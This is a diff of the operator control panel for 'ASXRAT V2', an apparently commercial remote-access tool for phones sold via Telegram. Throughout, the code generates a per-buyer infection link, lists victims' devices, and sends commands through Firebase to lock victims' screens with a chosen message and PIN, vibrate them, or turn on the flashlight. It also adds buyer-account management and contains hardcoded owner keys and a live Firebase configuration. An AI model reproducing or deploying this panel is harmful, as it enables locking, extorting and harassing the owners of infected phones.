@@ -3,75 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASXRAT V2 | SUPREME CONTROL</title>
+    <title>ASXRAT V2 | ELVOX OFFICIAL</title>
+    <link rel="preload" as="image" href="https://gangalink.vercel.app/i/3mo453em.jpg">
+    
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <style>
-        :root { --red: #ff0000; --bg: #000; --card: #111; --gold: #ffd700; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
+        :root { --red: #ff0000; --bg: #000; --glass: rgba(15, 15, 15, 0.98); }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
         
-        /* LOGIN BOX & BANNER */
-        #auth-box { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 15px; }
-        .banner-img { 
-            width: 100%; max-width: 420px; height: auto; min-height: 160px;
-            object-fit: fill; border: 2px solid var(--red); border-bottom: none; 
-            border-radius: 15px 15px 0 0; display: block; background: #000;
-        }
-        .login-card { 
-            background: var(--card); padding: 25px; border: 2px solid var(--red); 
-            border-radius: 0 0 15px 15px; width: 100%; max-width: 420px; 
-            text-align: center; margin-top: -1px; box-sizing: border-box; 
-        }
+        /* LOGIN UI */
+        .login-container { width: 100%; max-width: 400px; padding: 20px; box-sizing: border-box; }
+        .surx-banner { width: 100%; display: block; border: 2px solid var(--red); border-bottom: none; border-radius: 25px 25px 0 0; object-fit: cover; height: 160px; }
+        .login-card { background: var(--glass); border: 2px solid var(--red); padding: 30px 25px; border-radius: 0 0 25px 25px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,1); }
+        input { width: 100%; padding: 15px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 12px; text-align: center; font-weight: bold; outline: none; }
+        input:focus { border-color: var(--red); }
+        .btn-red { background: var(--red); color: #fff; border: none; padding: 16px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
+        .btn-buy { background: #0088cc; color: #fff; text-decoration: none; display: block; padding: 12px; margin-top: 15px; border-radius: 12px; font-weight: bold; font-size: 12px; text-align: center; }
+
+        /* DASHBOARD UI */
+        #main-ui { display: none; padding: 20px; width: 100%; max-width: 500px; position: absolute; top: 0; background: #000; min-height: 100vh; z-index: 100; }
+        .section-box { background: #0f0f0f; border: 1px solid #222; padding: 20px; border-radius: 25px; margin-bottom: 20px; border-left: 5px solid var(--red); }
         
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; }
-        .btn-main { background: var(--red); color: #fff; border: none; padding: 15px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        /* KHUSUS OWNER AREA */
+        #owner-area { display: none; border-left: 5px solid #fff; background: #111; }
         
-        /* DASHBOARD */
-        #dash { display: none; padding: 15px; max-width: 500px; margin: auto; }
-        .card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 20px; border-radius: 12px; border-left: 5px solid var(--red); position: relative; }
-        .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px; }
-        .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 12px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        .btn-panic { background: #ff0000; color: #fff; grid-column: span 2; border: 2px solid #fff; animation: blink 0.6s infinite; font-size: 13px; }
-        @keyframes blink { 0% {opacity:1} 50% {opacity:0.4} 100% {opacity:1} }
+        /* TARGET LIST */
+        .target-card { background: #080808; border: 1px solid #222; border-radius: 20px; padding: 15px; margin-bottom: 15px; border-left: 4px solid var(--red); }
+        .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
+        .btn-cmd { background: #1a1a1a; color: #fff; border: 1px solid #333; padding: 10px; border-radius: 10px; font-size: 11px; font-weight: bold; cursor: pointer; }
         
-        .boss-panel { border: 2px solid var(--gold); padding: 15px; border-radius: 12px; margin-bottom: 20px; display: none; background: #050505; }
-        .copy-box { background: #fff; color: #000; padding: 15px; border-radius: 10px; font-weight: bold; text-align: center; margin-bottom: 20px; cursor: pointer; }
+        /* MODAL */
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; }
+        .modal-box { background: #111; width: 85%; max-width: 350px; border-radius: 30px; padding: 25px; border: 1px solid #333; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div id="auth-box">
-        <img src="https://gangalink.vercel.app/i/3mo453em.jpg" class="banner-img">
+    <div id="auth-box" class="login-container">
+        <img src="https://gangalink.vercel.app/i/3mo453em.jpg" class="surx-banner">
         <div class="login-card">
-            <h3 style="color:red; margin:0 0 10px 0;">ASXRAT V2 LOGIN
-            POWERED BY : ELVOXI
-            CONNTACK TELEGRAM : @Elvoxi_Reals01</h3>
-            <input type="text" id="log-mail" placeholder="EMAIL...">
-            <input type="password" id="log-key" placeholder="SECRET KEY...">
-            <button onclick="login()" class="btn-main">MASUK PANEL</button>
+            <h1 style="color:red; margin:0; font-size:24px;">ASXRAT V2</h1>
+            <p style="font-size:11px; color:#ff4d4d; margin-bottom:20px; font-weight:bold;">⚠️ GUNAKAN DENGAN BIJAK ⚠️</p>
+            <input type="text" id="log-mail" placeholder="EMAIL ADDRESS">
+            <input type="password" id="log-key" placeholder="SECRET KEY">
+            <button onclick="login()" class="btn-red">INITIALIZE ACCESS</button>
+            <a href="https://t.me/Elvoxi_Reals01" class="btn-buy">🛒 BUY ACCOUNT ASXRAT</a>
+            <p style="font-size:10px; color:#444; margin-top:20px;">POWERED BY : ELVOX</p>
         </div>
     </div>
 
-    <div id="dash">
-        <div id="boss-panel" class="boss-panel">
-            <b style="color:var(--gold); display:block; text-align:center; margin-bottom:10px;">👑 BOSS CREATE ROLE</b>
-            <input type="text" id="new-mail" placeholder="Email Buyer...">
-            <input type="text" id="new-key" placeholder="Key Buyer...">
-            <select id="new-role"><option value="buyer">BUYER</option><option value="admin">ADMIN</option></select>
-            <button onclick="createAccount()" class="btn-main" style="background:var(--gold); color:black;">GENERATE ACCESS</button>
+    <div id="main-ui">
+        <div id="owner-area" class="section-box">
+            <h3 style="margin:0; font-size:14px; color:#fff;">🛠️ OWNER: CREATE BUYER ACCOUNT</h3>
+            <p style="font-size:10px; color:#666; margin: 5px 0 15px 0;">Role: OWNER can create unlimited BUYER keys.</p>
+            <input type="text" id="new-u-mail" placeholder="BUYER EMAIL">
+            <input type="text" id="new-u-key" placeholder="BUYER KEY">
+            <button onclick="createAccount()" class="btn-red" style="background:#fff; color:#000;">SAVE BUYER DATA</button>
         </div>
 
-        <div class="copy-box" onclick="salinLink()">
-            📋 SALIN LINK TARGET (AUTO-ID)
+        <div class="section-box">
+            <h3 style="margin:0 0 10px 0; font-size:14px; color:red;">🔗 YOUR INFECTION LINK</h3>
+            <input type="text" id="phishing-link" readonly style="color:red; font-size:10px;">
+            <button onclick="copyLink()" class="btn-red">📋 COPY LINK SEKARANG</button>
         </div>
 
-        <div id="list"></div>
+        <div id="target-list-container">
+            <p style="text-align:center; font-size:11px; color:#444;">-- ACTIVE VICTIM LIST --</p>
+            <div id="target-list"></div>
+        </div>
+        <button onclick="location.reload()" style="background:none; border:none; color:#333; width:100%; margin:30px 0; cursor:pointer;">LOGOUT SESSION</button>
+    </div>
+
+    <div id="lock-modal" class="modal-overlay">
+        <div class="modal-box">
+            <h2 style="color:red; margin:0 0 15px 0;">HARD LOCK</h2>
+            <input type="text" id="m-msg" placeholder="Pesan Layar Kunci">
+            <input type="password" id="m-pin" placeholder="PIN Unlock">
+            <div style="display:flex; gap:10px; margin-top:20px;">
+                <button onclick="closeModal()" class="btn-cmd" style="flex:1;">BATAL</button>
+                <button onclick="fireLock()" class="btn-red" style="flex:1; padding:10px;">LOCK</button>
+            </div>
+        </div>
     </div>
 
 <script>
-    // PENTING: Ganti link di bawah ini dengan link target.html lo di GitHub!
-    const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";
-
+    // 🔥 FIREBASE CONFIG FULL & LENGKAP 🔥
     const firebaseConfig = {
       apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
       authDomain: "rat-html.firebaseapp.com",
@@ -79,54 +97,73 @@
       projectId: "rat-html",
       storageBucket: "rat-html.firebasestorage.app",
       messagingSenderId: "1060124583265",
-      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
+      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
+      measurementId: "G-7Z9L3XN6Z9"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    
-    let currentKey = "";
-    let myRole = "";
+    const targetUrl = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";
+    let currentKey = "", activeTid = "";
 
     function login() {
-        const m = document.getElementById('log-mail').value, k = document.getElementById('log-key').value;
-        if(k === "elvoxi122" || k === "mario122") {
-            currentKey = k; myRole = "owner";
-            document.getElementById('boss-panel').style.display = 'block';
-            start();
+        const k = document.getElementById('log-key').value;
+        // LOGIC ROLE OWNER (MARIO)
+        if(k === "mario122" || k === "elvoxi122") {
+            currentKey = k;
+            document.getElementById('owner-area').style.display = 'block';
+            setupPanel();
         } else {
-            db.ref('asxrat/accounts/' + k).once('value', s => {
-                if(s.exists() && s.val().email === m) {
-                    currentKey = k; myRole = s.val().role;
-                    if(myRole === "admin") document.getElementById('boss-panel').style.display = 'block';
-                    start();
-                } else alert("DATA SALAH!");
+            // LOGIC ROLE USER (BUYER)
+            db.ref('mario/users/' + k).once('value', snap => {
+                if(snap.exists()) {
+                    currentKey = k;
+                    document.getElementById('owner-area').remove(); // Hapus paksa menu create biar buyer gak bisa fomo
+                    setupPanel();
+                } else { alert("KEY SALAH ATAU EXPIRED!"); }
             });
         }
     }
 
-    function createAccount() {
-        const m = document.getElementById('new-mail').value, k = document.getElementById('new-key').value, r = document.getElementById('new-role').value;
-        db.ref('asxrat/accounts/' + k).set({ email: m, role: r }).then(() => alert("BERHASIL CREATE!"));
+    function setupPanel() {
+        document.getElementById('phishing-link').value = targetUrl + "?id=" + btoa(currentKey);
+        document.getElementById('auth-box').style.display = 'none';
+        document.getElementById('main-ui').style.display = 'block';
+        loadTargets();
     }
 
-    function start() {
-        document.getElementById('auth-box').style.display = 'none';
-        document.getElementById('dash').style.display = 'block';
+    // 🔥 TEMPAT CREATE BUYER (SAVE KE DATABASE) 🔥
+    function createAccount() {
+        const mail = document.getElementById('new-u-mail').value;
+        const key = document.getElementById('new-u-key').value;
+        if(mail && key) {
+            db.ref('mario/users/' + key).set({
+                email: mail,
+                role: "buyer",
+                createdAt: Date.now()
+            }).then(() => {
+                alert("SUKSES! Buyer terdaftar dengan Key: " + key);
+                document.getElementById('new-u-mail').value = "";
+                document.getElementById('new-u-key').value = "";
+            });
+        } else { alert("ISI EMAIL & KEY!"); }
+    }
 
+    function loadTargets() {
         db.ref('mario/targets').on('value', snap => {
-            const list = document.getElementById('list'); list.innerHTML = "";
+            const list = document.getElementById('target-list');
+            list.innerHTML = "";
             snap.forEach(child => {
                 const d = child.val();
-                if(myRole === "owner" || d.belongsTo === currentKey) {
+                if(d.belongsTo === currentKey) {
                     list.innerHTML += `
-                    <div class="card">
-                        <b style="color:red">📱 ${d.model}</b> <small style="color:#444">(${d.belongsTo})</small>
-                        <div class="btn-grid">
-                            <button class="btn-rat btn-panic" onclick="sendL('${child.key}')">⚡ EXECUTE LOCK & STROBE</button>
-                            <button class="btn-rat" onclick="cmd('${child.key}', 'unlock')">🔓 UNLOCK</button>
-                            <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER ON</button>
-                            <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
-                            <button class="btn-rat" onclick="db.ref('mario/targets/${child.key}').remove()">🗑️ HAPUS</button>
+                    <div class="target-card">
+                        <b>📱 ${d.model}</b><br><small style="color:#444;">ID: ${child.key}</small>
+                        <div class="cmd-grid">
+                            <button class="btn-cmd" style="background:red;" onclick="openModal('${child.key}')">⚡ LOCK</button>
+                            <button class="btn-cmd" onclick="sendCmd('${child.key}', 'unlock')">🔓 UNLOCK</button>
+                            <button class="btn-cmd" onclick="sendCmd('${child.key}', 'vibrate')">📳 VIBRATE</button>
+                            <button class="btn-cmd" onclick="sendCmd('${child.key}', 'torch_on') text: 'flashlight'">🔦 FLASH</button>
                         </div>
                     </div>`;
                 }
@@ -134,22 +171,26 @@
         });
     }
 
-    function cmd(id, act) { db.ref('mario/commands/' + id).set({ action: act, time: Date.now() }); }
-    
-    function sendL(id) {
-        db.ref('mario/commands/' + id).set({ 
-            action: 'lock_screen', 
-            text: "DEVICE ENCRYPTED BY ASXRAT", 
-            pass: "123", 
-            time: Date.now() 
-        });
+    function sendCmd(id, act) {
+        db.ref('mario/commands/' + id).set({ action: act, time: Date.now() });
+        alert("Command Sent!");
     }
 
-    function salinLink() {
-        // Ini fungsinya Mar, buat nempel Key akun ke link target (base64)
-        const linkFix = linkWebTarget + "?id=" + btoa(currentKey);
-        navigator.clipboard.writeText(linkFix);
-        alert("LINK BERHASIL DISALIN!\nKirim ke target lo.");
+    function fireLock() {
+        const m = document.getElementById('m-msg').value;
+        const p = document.getElementById('m-pin').value;
+        db.ref('mario/commands/' + activeTid).set({ action: 'lock_screen', text: m, pass: p, time: Date.now() });
+        closeModal();
+    }
+
+    function openModal(id) { activeTid = id; document.getElementById('lock-modal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('lock-modal').style.display = 'none'; }
+    
+    function copyLink() {
+        const inp = document.getElementById('phishing-link');
+        inp.select();
+        navigator.clipboard.writeText(inp.value);
+        alert("LINK COPIED GACOR!");
     }
 </script>
 </body>
